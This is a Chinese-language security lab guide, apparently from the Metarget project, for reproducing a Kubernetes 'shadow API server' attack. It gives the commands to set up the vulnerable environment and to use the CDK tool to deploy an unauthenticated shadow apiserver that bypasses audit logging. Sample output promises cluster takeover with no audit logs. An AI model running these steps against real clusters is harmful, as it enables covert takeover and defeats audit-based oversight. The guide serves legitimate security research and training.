# 部署K8s影子API Server

## 场景介绍

该技术来源于 ["RSAC 2020: Advanced Persistence Threats: The Future of Kubernetes Attacks"](https://www.youtube.com/watch?v=CH7S5rE3j8w)，思路是在拥有Master节点上的create pod权限时，可创建一个具有API Server功能的Pod，使得后续命令可以通过新创建的“shadow api server”进行下发，绕过K8s的日志审计，更加具有隐蔽性。

## 环境搭建

基础环境（Docker+K8s）准备（如果已经有任意版本的Docker+K8s环境则可跳过）：

```bash
./metarget gadget install docker --version 18.03.1
./metarget gadget install k8s --version 1.16.5 --domestic
```

漏洞环境准备：

```bash
./metarget cnv install k8s_shadow_apiserver
```

执行完成后，K8s集群内`metarget`命令空间下将会创建一个名为`k8s-shadow-apiserver`的pod。

## 漏洞复现

下载漏洞利用工具[CDK](https://github.com/cdk-team/CDK)，将其传入`k8s-shadow-apiserver`pod中：

```
sudo kubectl cp cdk k8s-shadow-apiserver:/ -n metarget
```

执行以下命令运行工具（该命令会在kube-system命名空间下创建一个无需认证的shadow apiserver，可根据提示进行访问）：

```
sudo kubectl exec -it k8s-shadow-apiserver /cdk run k8s-shadow-apiserver default
```

查看执行结果包含以下字段则部署成功，也可通过运行`sudo kubectl get pods -n kube-sytem | grep shadow` 验证部署结果。

```
	shadow api-server deploy success!
shadow api-server pod name:kube-apiserver-cloudplay-shadow-r6r6rb, namespace:kube-system, node name:cloudplay
listening secure-port: https://cloudplay:9444
go further run `cdk kcurl default get https://cloudplay:9444/api` to takeover cluster with none audit logs!
```

注：复现后请及时清除相关资源。

## 参考文献

1. https://www.youtube.com/watch?v=CH7S5rE3j8w
2. https://www.cdxy.me/?p=839
3. https://github.com/cdk-team/CDK/wiki/Exploit:-k8s-shadow-apiserver

